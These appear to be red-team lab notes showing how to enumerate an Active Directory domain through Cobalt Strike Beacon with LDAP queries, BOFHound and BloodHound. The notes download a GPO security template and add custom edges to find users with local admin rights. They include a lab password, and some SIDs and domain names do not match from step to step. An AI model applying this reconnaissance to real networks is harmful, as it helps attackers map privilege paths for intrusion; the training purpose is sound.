- Use LDAP to enumerate the domain, users, groups, OUs, and GPOs.
    
```powershell
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) *,ntsecuritydescriptor

ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```
    
-  Copy the raw Beacon logs to the Attacker Desktop.
    
    1. From the Windows Terminal, open a tab for Ubuntu.
        
    2. cd /mnt/c/Users/Attacker/Desktop
        
    3. scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
        
        > The password is Passw0rd!.
        
-  Parse the logs with BOFHound
    
    1. bofhound -i logs

- Start Bloodhound CE and ingest data
- Using the following cypher query, search for GPOs in BloodHound:

```Cypher
Match (n:GPO) return n
```

- Select the 'Workstation Admins' GPO.
    1. Take note of its Gpcpath.
    2. Expand its 'Affected Objects' and select 'Computers'.

-  Select each computer and note their Obiect ID.

- Return to Beacon
- Using the gpcpath for the Workstations Admins GPO, download its **GptTmpl.inf** file using Beacon.

![[Pasted image 20250714094204.png]]

```powershell
ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\

download \\dublin.contoso.com\SysVol\dublin.contoso.com\Policies\{BC922AEC-8191-4B0D-8592-8C483703D7FD}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

- Sync the file to your Attacker Desktop.
    
    > View > Downloads.
    
-  Open the file in Notepad (or VSCode).
    
    1. Note the SID of the domain group.

![[Pasted image 20250714100312.png]]

> S-1-5-21-3926355307-1661546229-813047887-1106 is a member of S-1-5-32-544

```powershell
ldapsearch (objectSid=S-1-5-21-2958544638-1589230383-838459903-1605)
```

-  Add the custom edges in BloodHound.

```Cypher
MATCH (x:Computer{objectid:'S-1-5-21-2958544638-1589230383-838459903-3105'}) MATCH (y:Group{objectid:'S-1-5-21-2958544638-1589230383-838459903-3103'}) MERGE (y)-[:AdminTo]->(x)
```

```Cypher
MATCH (x:Computer{objectid:'S-1-5-21-2958544638-1589230383-838459903-2601'})
MATCH (y:Group{objectid:'S-1-5-21-2958544638-1589230383-838459903-1605'})
MERGE (y)-[:AdminTo]->(x)
```

> BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.